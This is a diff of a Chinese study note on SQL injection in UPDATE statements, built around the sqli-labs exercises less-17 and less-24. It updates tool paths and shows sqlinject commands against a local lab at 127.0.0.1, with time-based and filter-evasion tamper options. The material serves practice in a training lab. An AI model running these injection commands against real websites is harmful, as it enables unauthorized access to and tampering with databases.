@@ -4,7 +4,7 @@
 >
 > 总目录：[[../SQL总目录|SQL 总目录]] · 本目录 [[mysql结构总目录|mysql结构 总目录]]
 >
-> 工具箱：[[../../../../../hackingtools/web/README|hackingtools/web 工具箱]]
+> 工具箱：`~/hackingtools/web/injection/sqlinject`（工具库位于仓库外 `/home/a/hackingtools`）
 >
 > sqli-labs 对照：less-17（UPDATE 场景原型，注入点在 POST password）、less-24 第二阶段
 
@@ -369,22 +369,22 @@ curl -s "http://127.0.0.1/sqli-labs/Less-24/login.php" \
 
 ## 九、自动化：sqlinject.py 工具
 
-本章对应命令已内置在工具中，路径 `~/hackingtools/web/injection/sqlinject.py`（用法详见 [[../../../../../hackingtools/web/README|hackingtools/web 工具箱]]）：
+本章对应命令已内置在工具中，路径 `~/hackingtools/web/injection/sqlinject`（用法详见 `~/hackingtools/web/injection/sqlinject`（工具库位于仓库外 `/home/a/hackingtools`））：
 
 ```bash
 # POST 型 UPDATE 位报错注入：指定注入参数为 passwd
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-17/" \
   --data "uname=admin&passwd=x" -p passwd
 
 # 无报错回显时切时间模式
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-17/" \
   --data "uname=admin&passwd=x" -p passwd \
   --technique T --time-sec 4
 
 # 叠加过滤时组合 tamper（如目标同时过滤空格与 and/or）
-python3 ~/hackingtools/web/injection/sqlinject.py \
+python3 ~/hackingtools/web/injection/sqlinject \
   -u "http://127.0.0.1/sqli-labs/Less-17/" \
   --data "uname=admin&passwd=x" -p passwd \
   --tamper space2comment,doublewrite
